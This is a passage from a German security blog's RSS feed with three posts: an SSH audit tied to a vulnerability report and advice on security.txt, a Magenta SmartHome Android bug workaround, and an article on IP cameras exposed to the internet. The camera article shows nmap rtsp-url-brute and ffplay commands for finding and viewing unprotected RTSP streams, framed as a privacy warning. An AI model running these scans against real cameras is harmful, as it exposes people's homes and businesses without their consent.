-<pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group=""># general
-(gen) banner: SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3
-(gen) software: OpenSSH 8.4p1
-(gen) compatibility: OpenSSH 7.4+, Dropbear SSH 2018.76+
-(gen) compression: enabled (zlib@openssh.com)
-
-# security
-(cve) CVE-2021-41617                        -- (CVSSv2: 7.0) privilege escalation via supplemental groups
-(cve) CVE-2016-20012                        -- (CVSSv2: 5.3) enumerate usernames via challenge response
-
-# key exchange algorithms
-(kex) curve25519-sha256                     -- [info] available since OpenSSH 7.4, Dropbear SSH 2018.76
-                                            `- [info] default key exchange since OpenSSH 6.4
-(kex) curve25519-sha256@libssh.org          -- [info] available since OpenSSH 6.4, Dropbear SSH 2013.62
-                                            `- [info] default key exchange since OpenSSH 6.4
-(kex) ecdh-sha2-nistp256                    -- [fail] using elliptic curves that are suspected as being backdoored by the U.S. National Security Agency
-                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
-(kex) ecdh-sha2-nistp384                    -- [fail] using elliptic curves that are suspected as being backdoored by the U.S. National Security Agency
-                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
-(kex) ecdh-sha2-nistp521                    -- [fail] using elliptic curves that are suspected as being backdoored by the U.S. National Security Agency
-                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
-(kex) diffie-hellman-group-exchange-sha256 (3072-bit) -- [info] available since OpenSSH 4.4
-                                                      `- [info] OpenSSH's GEX fallback mechanism was triggered during testing. Very old SSH clients will still be able to create connections using a 2048-bit modulus, though modern clients will use 3072. This can only be disabled by recompiling the code (see https://github.com/openssh/openssh-portable/blob/V_9_4/dh.c#L477).
-(kex) diffie-hellman-group16-sha512         -- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73
-(kex) diffie-hellman-group18-sha512         -- [info] available since OpenSSH 7.3
-(kex) diffie-hellman-group14-sha256         -- [warn] 2048-bit modulus only provides 112-bits of symmetric strength
-                                            `- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73
-(kex) kex-strict-s-v00@openssh.com          -- [info] pseudo-algorithm that denotes the peer supports a stricter key exchange method as a counter-measure to the Terrapin attack (CVE-2023-48795)
-
-# host-key algorithms
-(key) rsa-sha2-512 (2048-bit)               -- [warn] 2048-bit modulus only provides 112-bits of symmetric strength
-                                            `- [info] available since OpenSSH 7.2
-(key) rsa-sha2-256 (2048-bit)               -- [warn] 2048-bit modulus only provides 112-bits of symmetric strength
-                                            `- [info] available since OpenSSH 7.2
-(key) ssh-rsa (2048-bit)                    -- [fail] using broken SHA-1 hash algorithm
-                                            `- [warn] 2048-bit modulus only provides 112-bits of symmetric strength
-                                            `- [info] available since OpenSSH 2.5.0, Dropbear SSH 0.28
-                                            `- [info] deprecated in OpenSSH 8.8: https://www.openssh.com/txt/release-8.8
-(key) ecdsa-sha2-nistp256                   -- [fail] using elliptic curves that are suspected as being backdoored by the U.S. National Security Agency
-                                            `- [warn] using weak random number generator could reveal the key
-                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
-(key) ssh-ed25519                           -- [info] available since OpenSSH 6.5
-
-# encryption algorithms (ciphers)
-(enc) chacha20-poly1305@openssh.com         -- [info] available since OpenSSH 6.5
-                                            `- [info] default cipher since OpenSSH 6.9
-(enc) aes128-ctr                            -- [info] available since OpenSSH 3.7, Dropbear SSH 0.52
-(enc) aes192-ctr                            -- [info] available since OpenSSH 3.7
-(enc) aes256-ctr                            -- [info] available since OpenSSH 3.7, Dropbear SSH 0.52
-(enc) aes128-gcm@openssh.com                -- [info] available since OpenSSH 6.2
-(enc) aes256-gcm@openssh.com                -- [info] available since OpenSSH 6.2
-
-# message authentication code algorithms
-(mac) umac-64-etm@openssh.com               -- [warn] using small 64-bit tag size
-                                            `- [info] available since OpenSSH 6.2
-(mac) umac-128-etm@openssh.com              -- [info] available since OpenSSH 6.2
-(mac) hmac-sha2-256-etm@openssh.com         -- [info] available since OpenSSH 6.2
-(mac) hmac-sha2-512-etm@openssh.com         -- [info] available since OpenSSH 6.2
-(mac) hmac-sha1-etm@openssh.com             -- [fail] using broken SHA-1 hash algorithm
-                                            `- [info] available since OpenSSH 6.2
-(mac) umac-64@openssh.com                   -- [warn] using encrypt-and-MAC mode
-                                            `- [warn] using small 64-bit tag size
-                                            `- [info] available since OpenSSH 4.7
-(mac) umac-128@openssh.com                  -- [warn] using encrypt-and-MAC mode
-                                            `- [info] available since OpenSSH 6.2
-(mac) hmac-sha2-256                         -- [warn] using encrypt-and-MAC mode
-                                            `- [info] available since OpenSSH 5.9, Dropbear SSH 2013.56
-(mac) hmac-sha2-512                         -- [warn] using encrypt-and-MAC mode
-                                            `- [info] available since OpenSSH 5.9, Dropbear SSH 2013.56
-(mac) hmac-sha1                             -- [fail] using broken SHA-1 hash algorithm
-                                            `- [warn] using encrypt-and-MAC mode
-                                            `- [info] available since OpenSSH 2.1.0, Dropbear SSH 0.28
-
-# fingerprints
-(fin) ssh-ed25519: SHA256:vwCCSg+OuRwAflHQs/+Y22UJ7p2lM57vbukGFt5AAaY
-(fin) ssh-rsa: SHA256:o+WUM9bAmH2G5xMAsJfZRsmh8hvMoU4dx9gdmahLM+M
-
-# algorithm recommendations (for OpenSSH 8.4)
-(rec) -ecdh-sha2-nistp256                   -- kex algorithm to remove 
-(rec) -ecdh-sha2-nistp384                   -- kex algorithm to remove 
-(rec) -ecdh-sha2-nistp521                   -- kex algorithm to remove 
-(rec) -ecdsa-sha2-nistp256                  -- key algorithm to remove 
-(rec) -hmac-sha1                            -- mac algorithm to remove 
-(rec) -hmac-sha1-etm@openssh.com            -- mac algorithm to remove 
-(rec) -ssh-rsa                              -- key algorithm to remove 
-(rec) !rsa-sha2-256                         -- key algorithm to change (increase modulus size to 3072 bits or larger) 
-(rec) !rsa-sha2-512                         -- key algorithm to change (increase modulus size to 3072 bits or larger) 
-(rec) -diffie-hellman-group14-sha256        -- kex algorithm to remove 
-(rec) -hmac-sha2-256                        -- mac algorithm to remove 
-(rec) -hmac-sha2-512                        -- mac algorithm to remove 
-(rec) -umac-128@openssh.com                 -- mac algorithm to remove 
-(rec) -umac-64-etm@openssh.com              -- mac algorithm to remove 
-(rec) -umac-64@openssh.com                  -- mac algorithm to remove 
-
-# additional info
-(nfo) For hardening guides on common OSes, please see: &lt;https://www.ssh-audit.com/hardening_guides.html>
-(nfo) Be aware that, while this target properly supports the strict key exchange method (via the kex-strict-?-v00@openssh.com marker) needed to protect against the Terrapin vulnerability (CVE-2023-48795), all peers must also support this feature as well, otherwise the vulnerability will still be present.  The following algorithms would allow an unpatched peer to create vulnerable SSH channels with this target: chacha20-poly1305@openssh.com.  If any CBC ciphers are in this list, you may remove them while leaving the *-etm@openssh.com MACs in place; these MACs are fine while paired with non-CBC cipher types.
-</pre>
-
-
-
-<p>Joar, das sieht tatsächlich nicht ganz so optimal aus. Ein Hinweis darauf ist also nicht unberechtigt. Ich habe dem Finder also freundlich und dankbar geantwortet, aber auch darauf hingewiesen, dass das System nicht zu meiner Infrastruktur gehört. Zusätzlich habe ich ihm die relevanten Whois-Informationen zur IPv4 des angegebenen Hosts mitgeschickt.</p>
-
-
-
-<p>Seine Antwort hat nicht lange auf sich warten lassen:</p>
-
-
-
-<pre class="wp-block-preformatted">Thank you for your answer.<br><br>Let me know if you need anything else from myside<br><br>I hope this type of hard efforts deserves something reward</pre>
-
-
-
-<p>Hm&#8230; <em>&#8222;hard efforts&#8220;</em>. Ich will das jetzt nicht schlechtreden. Wäre der Hinweis im beruflichen Umfeld angekommen, hätte ich mich vielleicht sogar für eine Kleinigkeit stark gemacht. Aber da es hier nur um meine private Infrastruktur geht – und dann noch mit dem JavaScript-Hinweis und der Meldung zu einem fremden System – wirkt das Ganze doch etwas oberflächlich. Also habe ich ihn freundlich darauf hingewiesen.</p>
-
-
-
-<p><strong>Mein Tipp für den Umgang mit solchen Meldungen</strong></p>
-
-
-
-<p>Wenn euch mal eine solche Nachricht erreicht: Schnell und freundlich reagieren! Den Report ernst nehmen, bewerten und eine angemessene Rückmeldung geben. Die Mühe des Finders sollte wertgeschätzt werden. Zwei Wochen später mit &#8222;Anzeige ist raus!&#8220; zu antworten, wäre der falsche Weg. Denn ganz ehrlich: Es ist für jemanden deutlich aufwendiger, sich die Mühe zu machen, eine Meldung zu schreiben, als einfach das Ganze in ein passendes Darknet-Forum zu posten und dort ein paar XMR oder Bitcoin einzusammeln.</p>
-
-
-
-<p>Macht es den Leuten also möglichst einfach, euch zu kontaktieren. Eine <code><a href="https://www.kernel-error.de/.well-known/security.txt" target="_blank" rel="noreferrer noopener">security.txt</a></code> oder klare Kontaktinformationen für eine Security-Mailbox helfen ungemein. Hauptsache, jemand kann seinen Report unkompliziert abgeben – und er wird von jemandem gelesen, der das Ganze bewerten kann.</p>
-
-
-
-<p>Hier noch etwas zum klicken für die security.txt:<br><a href="https://securitytxt.org/" target="_blank" rel="noreferrer noopener">https://securitytxt.org/</a><br><a href="https://de.wikipedia.org/wiki/Security.txt" target="_blank" rel="noreferrer noopener">https://de.wikipedia.org/wiki/Security.txt</a><br><a href="https://www.allianz-fuer-cybersicherheit.de/Webs/ACS/DE/Home/_/infos/20240430_securitytxt.html" target="_blank" rel="noreferrer noopener">https://www.allianz-fuer-cybersicherheit.de/Webs/ACS/DE/Home/_/infos/20240430_securitytxt.html</a></p>
-
-
-
-<p>Meine SSH Konfiguration sieht von außen wie folgt aus:</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group=""># general
-(gen) banner: SSH-2.0-OpenSSH_9.7 DemMeisterSeinRennAuto
-(gen) software: OpenSSH 9.7
-(gen) compatibility: OpenSSH 8.5+, Dropbear SSH 2018.76+
-(gen) compression: enabled (zlib@openssh.com)
-
-# key exchange algorithms
-(kex) sntrup761x25519-sha512@openssh.com    -- [info] available since OpenSSH 8.5
-(kex) curve25519-sha256                     -- [info] available since OpenSSH 7.4, Dropbear SSH 2018.76
-                                            `- [info] default key exchange since OpenSSH 6.4
-(kex) curve25519-sha256@libssh.org          -- [info] available since OpenSSH 6.4, Dropbear SSH 2013.62
-                                            `- [info] default key exchange since OpenSSH 6.4
-(kex) diffie-hellman-group16-sha512         -- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73
-(kex) diffie-hellman-group18-sha512         -- [info] available since OpenSSH 7.3
-(kex) diffie-hellman-group-exchange-sha256 (3072-bit) -- [info] available since OpenSSH 4.4
-                                                      `- [info] OpenSSH's GEX fallback mechanism was triggered during testing. Very old SSH clients will still be able to create connections using a 2048-bit modulus, though modern clients will use 3072. This can only be disabled by recompiling the code (see https://github.com/openssh/openssh-portable/blob/V_9_4/dh.c#L477).
-(kex) ext-info-s                            -- [info] pseudo-algorithm that denotes the peer supports RFC8308 extensions
-(kex) kex-strict-s-v00@openssh.com          -- [info] pseudo-algorithm that denotes the peer supports a stricter key exchange method as a counter-measure to the Terrapin attack (CVE-2023-48795)
-
-# host-key algorithms
-(key) ssh-ed25519                           -- [info] available since OpenSSH 6.5
-
-# encryption algorithms (ciphers)
-(enc) aes256-gcm@openssh.com                -- [info] available since OpenSSH 6.2
-(enc) aes128-gcm@openssh.com                -- [info] available since OpenSSH 6.2
-(enc) aes256-ctr                            -- [info] available since OpenSSH 3.7, Dropbear SSH 0.52
-(enc) aes192-ctr                            -- [info] available since OpenSSH 3.7
-(enc) aes128-ctr                            -- [info] available since OpenSSH 3.7, Dropbear SSH 0.52
-
-# message authentication code algorithms
-(mac) hmac-sha2-256-etm@openssh.com         -- [info] available since OpenSSH 6.2
-(mac) hmac-sha2-512-etm@openssh.com         -- [info] available since OpenSSH 6.2
-(mac) umac-128-etm@openssh.com              -- [info] available since OpenSSH 6.2
-
-# fingerprints
-(fin) ssh-ed25519: SHA256:kPRXNCMRLiHfvJunW2CbW5H3NZmn3Wkx2KnHJXl1aLc
-
-# algorithm recommendations (for OpenSSH 9.7)
-(rec) +rsa-sha2-256                         -- key algorithm to append 
-(rec) +rsa-sha2-512                         -- key algorithm to append </pre>
-
-
-
-<p></p>
-]]></content:encoded>
-					
-					<wfw:commentRss>https://www.kernel-error.de/2025/02/17/sicherheitsluecken-melden-mein-umgang-mit-einem-vulnerability-report/feed/</wfw:commentRss>
-			<slash:comments>1</slash:comments>
-		
-		
-			</item>
-		<item>
-		<title>Magenta SmartHome Lüften: Lösung für Android-Probleme gefunden</title>
-		<link>https://www.kernel-error.de/2025/01/23/magenta-smarthome-loesung-fuer-lueften-probleme-auf-android/</link>
-					<comments>https://www.kernel-error.de/2025/01/23/magenta-smarthome-loesung-fuer-lueften-probleme-auf-android/#respond</comments>
-		
-		<dc:creator><![CDATA[kernel-error]]></dc:creator>
-		<pubDate>Thu, 23 Jan 2025 16:11:33 +0000</pubDate>
-				<category><![CDATA[Kernel-Error-Blog]]></category>
-		<category><![CDATA[Magenta]]></category>
-		<category><![CDATA[SmartHome]]></category>
-		<category><![CDATA[Telekom]]></category>
-		<guid isPermaLink="false">https://www.kernel-error.de/?p=3124</guid>
-
-					<description><![CDATA[Seit inzwischen knapp 10 Jahren nutze ich das Magenta SmartHome-System. Eine der wirklich praktischen Funktionen ist &#8222;Lüften&#8220;. Sobald ein Tür- oder Fensterkontakt signalisiert, dass er geöffnet ist, wird ein Signal an die Heizungsventile gesendet, damit diese schließen. Gerade mit Kindern im Haushalt ist das eine tolle Funktion, denn so heize ich nicht versehentlich durch ein [&#8230;]]]></description>
-										<content:encoded><![CDATA[
-<p>Seit inzwischen knapp 10 Jahren nutze ich das Magenta SmartHome-System. Eine der wirklich praktischen Funktionen ist &#8222;Lüften&#8220;.</p>
-
-
-
-<figure class="wp-block-embed alignleft is-type-video is-provider-youtube wp-block-embed-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
-<iframe loading="lazy" title="Germans might love fresh air a bit too much" width="676" height="380" src="https://www.youtube.com/embed/WtHS2ax713Q?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
-</div></figure>
-
-
-
-<p>Sobald ein Tür- oder Fensterkontakt signalisiert, dass er geöffnet ist, wird ein Signal an die Heizungsventile gesendet, damit diese schließen. Gerade mit Kindern im Haushalt ist das eine tolle Funktion, denn so heize ich nicht versehentlich durch ein offenes Fenster oder gleich die ganze Terrasse.</p>
-
-
-
-<p>Diese Funktion findest du in der SmartHome-App unter: <strong>Mehr → Heizung → Overflow-Menü → Einstellungen → Sensoren konfigurieren</strong>. Dort kannst du für jeden Raum die Kontakte auswählen, die für die Funktion genutzt werden sollen.</p>
-
-
-<div class="wp-block-image">
-<figure class="alignleft size-large is-resized"><a href="https://www.kernel-error.de/wp-content/uploads/2025/01/Telekom-Magenta-SmartHome-App.png" target="_blank" rel=" noreferrer noopener"><img loading="lazy" decoding="async" width="461" height="1024" src="https://www.kernel-error.de/wp-content/uploads/2025/01/Telekom-Magenta-SmartHome-App-461x1024.png" alt="Screenshot der Telekom Magenta SmartHome App auf einem Andriod. Gezeigt wird das Menü Sensoren konfigurieren, für die Funktion Lüften der Heizungssteuerung." class="wp-image-3125" style="width:80px;height:auto" srcset="https://www.kernel-error.de/wp-content/uploads/2025/01/Telekom-Magenta-SmartHome-App-461x1024.png 461w, https://www.kernel-error.de/wp-content/uploads/2025/01/Telekom-Magenta-SmartHome-App-135x300.png 135w, https://www.kernel-error.de/wp-content/uploads/2025/01/Telekom-Magenta-SmartHome-App-768x1707.png 768w, https://www.kernel-error.de/wp-content/uploads/2025/01/Telekom-Magenta-SmartHome-App-691x1536.png 691w, https://www.kernel-error.de/wp-content/uploads/2025/01/Telekom-Magenta-SmartHome-App-922x2048.png 922w, https://www.kernel-error.de/wp-content/uploads/2025/01/Telekom-Magenta-SmartHome-App-676x1502.png 676w, https://www.kernel-error.de/wp-content/uploads/2025/01/Telekom-Magenta-SmartHome-App.png 1080w" sizes="auto, (max-width: 461px) 100vw, 461px" /></a></figure></div>
-
-
-<p>Vor knapp zwei Jahren ist mir in der Winterzeit aufgefallen, dass ein ausgetauschter Sensor zwar einwandfrei funktionierte, aber von der &#8222;Lüften&#8220;-Funktion komplett ignoriert wurde. Also habe ich im Menü nachgeschaut: Der Sensor wurde als <strong>nicht ausgewählt</strong> angezeigt (grauer Haken oben rechts auf der Kachel). Ich wählte ihn aus, bestätigte mit dem Haken, wechselte erneut ins Menü „Sensoren konfigurieren“ – und der Sensor war wieder nicht ausgewählt. Ein endloser Kreislauf.</p>
-
-
-
-<p>Zuerst dachte ich, das Problem liegt vielleicht an meinem Smartphone. Doch auch auf dem Gerät meiner Frau zeigte sich derselbe Fehler. Also: App deinstallieren, neu installieren. Leider ohne Erfolg.</p>
-
-
-
-<p>Daraufhin kontaktierte ich den Magenta SmartHome-Support und schilderte mein Problem. Die Antwort kam nach ein paar Tagen: Ein alter Sensor blockiere wohl die Funktion. Als Lösung schlug man vor, die komplette SmartHome-App von der Zentrale zu löschen und alles neu einzurichten. Das hätte bedeutet, dass meine gesamte Konfiguration, alle Regeln und Szenen verloren gehen – und ich jedes Gerät neu anlernen müsste.</p>
-
-
-
-<p>Da ich zahlreiche Geräte im Einsatz habe, war das für mich keine Option. Also entschied ich mich, abzuwarten. Schließlich war ich nicht der Einzige mit diesem Problem, und früher oder später würde es sicher eine Lösung geben.</p>
-
-
-
-<p>Nun ist wieder Winter, und das Problem besteht weiterhin. Also wandte ich mich erneut an den Support, in der Hoffnung auf eine bessere Lösung. Diesmal bekam ich folgende Antwort:</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">Das Problem ist hier, dass noch ein alter bereits abgelernter Tür-Fensterkontakt in der Lüften Einstellung fest hängt.
-Erkennen kann man dies in der Android App bei der Auswahl der Tür-Fensterkontakte. Hier wird oben in der Titelzeile die Anzahl der ausgewählten Geräte angezeigt. 
-Ist die Zahl hier höher, als die sichtbar ausgewählten Tür-Fensterkontakte, so ist der Kunde von diesem Problem betroffen.
-Unter iOS wird die Anzahl der ausgewählten Tür-Fensterkontakte nicht angezeigt.
-
-Update 08.01.2025: Es wird noch ein weiteres Magenta SmartHome App Release mit Fehlerbehebungen geben. Es ist geplant, dass der Fehler dort behoben wird.
- 
-Workaround 1: Da der Fehler nur in der Android App auftritt, kann man das Problem mit der iOS App lösen. Mit der iOS App reicht es einen Tür-Fensterkontakt abzuwählen und zu speichern.
-Danach lassen sich die aktuell angelernten Tür-Fensterkontakte wieder wie gewohnt auswählen/abwählen und auch speichern. Auch in der Android App.
-Sofern der Kunde also ein iOS Gerät hat, ist dieser Workaround dem Workaround 2 zu bevorzugen.
-
-Workaround 2: Das Plugin vom 3rd Level löschen lassen. Hier muss der Kunde dann jedoch alle Einstellungen, die er in der App vorgenommen hat, wieder neu Einrichten.
-Regeln, Szenen, Heizkurve,  Übersichten ... alles. Insofern fragt bitte den Kunden bevor ihr ein 3rd Level Ticket erstellt, ob er mit dieser Löschung einverstanden ist. </pre>
-
-
-
-<p>Workaround 2 war für mich weiterhin keine Option. Aber Workaround 1 klang vielversprechend – ein iOS-Gerät hatte ich noch im Regal. Also installierte ich die App, ging ins Menü „Sensoren konfigurieren“, wählte die gewünschten Sensoren aus – und siehe da: Es funktionierte! Seitdem läuft die Funktion auch wieder einwandfrei unter Android.</p>
-
-
-
-<p>Man stelle sich vor, ich hätte tatsächlich den aufwendigeren Workaround 2 gewählt, nur um später herauszufinden, dass ein einmaliger Abstecher in die iOS-App genügt hätte.</p>
-
-
-
-<p>Vielleicht rettet diese Info ja jemanden vor unnötigem Aufwand <img src="https://s.w.org/images/core/emoji/15.1.0/72x72/1f609.png" alt="😉" class="wp-smiley" style="height: 1em; max-height: 1em;" /> Laut Support soll das Problem mit einem zukünftigen Update behoben werden.</p>
-
-
-
-<p></p>
-]]></content:encoded>
-					
-					<wfw:commentRss>https://www.kernel-error.de/2025/01/23/magenta-smarthome-loesung-fuer-lueften-probleme-auf-android/feed/</wfw:commentRss>
-			<slash:comments>0</slash:comments>
-		
-		
-			</item>
-		<item>
-		<title>IP-Kameras als Sicherheitsrisiko: GeoGuessr und Datenschutz im Fokus​</title>
-		<link>https://www.kernel-error.de/2025/01/20/geoguessr-im-cyber-sicherheitskontext-wie-ip-kameras-zum-risiko-werden-koennen/</link>
-					<comments>https://www.kernel-error.de/2025/01/20/geoguessr-im-cyber-sicherheitskontext-wie-ip-kameras-zum-risiko-werden-koennen/#comments</comments>
-		
-		<dc:creator><![CDATA[kernel-error]]></dc:creator>
-		<pubDate>Mon, 20 Jan 2025 12:50:20 +0000</pubDate>
-				<category><![CDATA[Kernel-Error-Blog]]></category>
-		<category><![CDATA[CCTV]]></category>
-		<category><![CDATA[Security]]></category>
-		<category><![CDATA[shodan.io]]></category>
-		<category><![CDATA[Überwachungskamera]]></category>
-		<category><![CDATA[Webcam]]></category>
-		<guid isPermaLink="false">https://www.kernel-error.de/?p=3109</guid>
-
-					<description><![CDATA[Die meisten von euch werden das Spiel GeoGuessr kennen. Man bekommt ein Google-Street-View-Bild gezeigt, kann sich vielleicht noch ein paar Meter hin- und herbewegen und muss dann auf einer Weltkarte einen Marker setzen, wo man meint, dass dieses Bild aufgenommen wurde. Wer dem Punkt am nächsten kommt, gewinnt. Eine etwas abgewandelte Version begegnet mir immer [&#8230;]]]></description>
-										<content:encoded><![CDATA[
-<p>Die meisten von euch werden das Spiel <a href="https://de.wikipedia.org/wiki/GeoGuessr" target="_blank" rel="noreferrer noopener">GeoGuessr</a> kennen. Man bekommt ein Google-Street-View-Bild gezeigt, kann sich vielleicht noch ein paar Meter hin- und herbewegen und muss dann auf einer Weltkarte einen Marker setzen, wo man meint, dass dieses Bild aufgenommen wurde. Wer dem Punkt am nächsten kommt, gewinnt.</p>
-
-
-
-<p>Eine etwas abgewandelte Version begegnet mir immer mal wieder, wenn ich mich an einem Bug-Bounty-Programm beteilige oder einfach mit offenen Augen durchs Internet spaziere. Damit ist natürlich kein aktives Port-Scanning auf Netzblöcke oder Ähnliches gemeint.</p>
-
-
-
-<h3 class="wp-block-heading">Worum geht es genau?</h3>
-
-
-
-<p>In den letzten Jahren verbreiten sich immer mehr billige &#8222;China-Kameras&#8220; bei Heimanwendern, aber auch bei Unternehmen. Dagegen spricht erst einmal nichts.</p>
-
-
-
-<p>Was leider oft übersehen wird, sind die kleinen automatischen Helferlein, die die Einrichtung und den Betrieb einer solchen Kamera möglichst einfach machen sollen. UPnP (Universal Plug and Play) haben manche vielleicht schon mal im Zusammenhang mit Windows 95 oder USB gehört (ja, ich bin alt …). So etwas gibt es aber auch für Router und Firewalls, also für Netzwerke. Bei einer Fritzbox nennt sich das beispielsweise &#8222;Automatische Portfreigabe&#8220;.</p>
-
-
-
-<p>Der eine oder andere ahnt jetzt sicher schon etwas: Es gibt IP-Kameras, die sich so – vielleicht sogar ohne das Wissen des Betreibers – selbst über das Internet erreichbar machen. Das betrifft nicht selten die komplette Weboberfläche. Mal ist diese kennwortgeschützt, mal nicht.</p>
-
-
-
-<p>Sehr oft findet sich auch nur der RTSP-Port (Real Time Streaming Protocol) offen im Internet. Per RTSP werfen solche Kameras oft einen einfachen Videostream aus, der die Anbindung an zentrale Videoüberwachungssysteme erlaubt. Auch RTSP-Streams lassen sich mit einer Anmeldung schützen, was aber scheinbar in der Regel werkseitig deaktiviert ist.</p>
-
-
-
-<p>Wenn dieser Port offen ist, könnte man sich einfach per <code>ffplay</code> einen solchen Stream anschauen:</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">ffplay rtsp://1.2.3.4/11</pre>
-
-
-
-<p>Wenn man sich nicht sicher ist, wie die korrekte RTSP-URL für die jeweilige IP-Kamera lautet, kann <code>nmap</code> zusammen mit dem Script <a href="https://nmap.org/nsedoc/scripts/rtsp-url-brute.html" target="_blank" rel="noreferrer noopener"><code>rtsp-url-brute</code> </a>helfen:</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">nmap --script rtsp-url-brute -p 554 1.2.3.4</pre>
-
-
-
-<h3 class="wp-block-heading">Die rechtliche Lage</h3>
-
-
-
-<p>Nun kann es natürlich rechtlich schwierig sein, bei einer fremden IP-Adresse nach dem offenen Port 554/TCP zu suchen, dort per <code>nmap</code> nach einer nutzbaren RTSP-URL zu scannen und sich den Stream dann live per <code>ffplay</code>, <code>nmap</code> oder <code>vlc</code> anzuschauen. Schließlich hat man nicht das Einverständnis des Betreibers.</p>
-
-
-<div class="wp-block-image">
-<figure class="alignleft size-large is-resized"><a href="https://www.kernel-error.de/wp-content/uploads/2025/01/shodan-example.jpg"><img loading="lazy" decoding="async" width="1024" height="734" src="https://www.kernel-error.de/wp-content/uploads/2025/01/shodan-example-1024x734.jpg" alt="Screenshot of shodan search engine, filtering for RTSP Streams." class="wp-image-3112" style="width:225px;height:auto" srcset="https://www.kernel-error.de/wp-content/uploads/2025/01/shodan-example-1024x734.jpg 1024w, https://www.kernel-error.de/wp-content/uploads/2025/01/shodan-example-300x215.jpg 300w, https://www.kernel-error.de/wp-content/uploads/2025/01/shodan-example-768x550.jpg 768w, https://www.kernel-error.de/wp-content/uploads/2025/01/shodan-example-1536x1101.jpg 1536w, https://www.kernel-error.de/wp-content/uploads/2025/01/shodan-example-676x485.jpg 676w, https://www.kernel-error.de/wp-content/uploads/2025/01/shodan-example.jpg 1931w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /></a></figure></div>
-
-
-<p>Natürlich hält das wohl weniger Menschen ab, die ohnehin Schlechtes im Sinn haben. Ebenfalls gibt es verschiedene Dienste, die 24/7 nichts anderes tun. Ein Beispiel ist hier vielleicht <strong><a href="https://www.shodan.io/" target="_blank" rel="noreferrer noopener">shodan.io</a></strong> – dort lässt sich direkt nach solchen Vorschaubildern filtern, ohne dass man selbst eine Verbindung zu betroffenen IPs aufnehmen muss.</p>
-
-
-
-<h3 class="wp-block-heading">Warum ist das alles überhaupt problematisch?</h3>
-
-
-
-<p>Hat ein Angreifer Böses im Sinn, ist ein Zugriff auf die Überwachungskamera sehr hilfreich. Man kommt so möglicherweise an Insiderinformationen, findet heraus, wo wertvolle Dinge gelagert werden, wann und wie die Öffnungszeiten sind oder sogar mögliche Zugangscodes und Kennwörter. Natürlich auch, welche Kunden sich zu welcher Zeit dort aufhalten usw.</p>
-
-
-
-<p>Denkt man an eine Arztpraxis, kann das schnell eine echte Datenschutzkatastrophe werden. Wenn die Kamera im Wohnzimmer oder Schlafzimmer einer Wohnung steht, führt das ebenfalls schnell zu ungewollten Einblicken.</p>
-
-
-
-<p>Wenn man einmal außer Acht lässt, dass niemand gerne ohne sein Wissen per Livestream im Internet zu sehen ist, halte ich das Thema Datenschutz für eines der größten Risiken.</p>
-
-
-
-<p>In der Vergangenheit sind mir bereits Beispiele begegnet, die das Problem verdeutlichen: Arztpraxen mit Kamerablick von hinten auf die Anmeldung – inklusive direktem Blick auf Patienten, Monitore mit Patientendaten oder Vertragsabschlüsse bei Mobilfunkanbietern. Auch Überwachungskameras in DHL-Filialen, die Bild und Ton in Zoom und 4K aufzeichnen, habe ich gesehen.</p>
-
-
-
-<p>Für private Betreiber kann es ebenfalls schnell zu einem Datenschutzproblem werden. Nicht jeder achtet beim eingestellten Bildausschnitt der Kamera darauf, die Vorgaben des Datenschutzes einzuhalten. So werden oft mehr öffentliche Bereiche oder sogar Nachbargrundstücke gefilmt, als zulässig ist.</p>
-
-
-
-<p>Wenn diese Daten dann auch noch ohne Schutz und Hürden in die Hände Dritter geraten, wird es heikel. Hier sollte besser jemand mit rechtlichem Hintergrund eine Einschätzung abgeben. Für mich klingt das alles jedenfalls ziemlich unschön.</p>
-
-
-
-<h3 class="wp-block-heading">Was kann man tun?</h3>
-
-
-
-<p>Eine Abuse-Mail an den jeweiligen ISP (Internet Service Provider) schicken, mit der Bitte, ihre Kunden zu informieren? Kann man machen. Bei kleineren ISPs klappt das oft sogar, und die Betreiber werden informiert. Spricht man aber über einen großen ISP wie die Telekom, verschwinden einzelne Abuse-Mails gefühlt einfach im Nichts.</p>
-
-
-
-<p>Sonst jemanden zu finden, der ein Interesse daran hat, den meist unwissenden Betreiber zu informieren, ist nahezu unmöglich. Weder unsere Behörden noch das BSI interessieren sich dafür. Möchte man also den Betreiber darauf hinweisen, bleibt realistisch nur die Möglichkeit, ihn selbst zu kontaktieren.</p>
-
-
-
-<h3 class="wp-block-heading">GeoGuessr in der Praxis</h3>
-
-
-
-<p>Jetzt sind wir beim Thema GeoGuessr: Man hat also nur das Bild der Kamera, die IP-Adresse mit einer recht groben und nicht immer stimmigen Geolokalisierung und vielleicht noch ein paar weitere Rahmeninfos oder Dienste auf dieser IP-Adresse. Hin und wieder macht es mir daher sogar Spaß, den eigentlichen Betreiber ausfindig zu machen und ihm per E-Mail oder telefonisch kurz auf diesen möglichen Missstand hinzuweisen.</p>
-
-
-
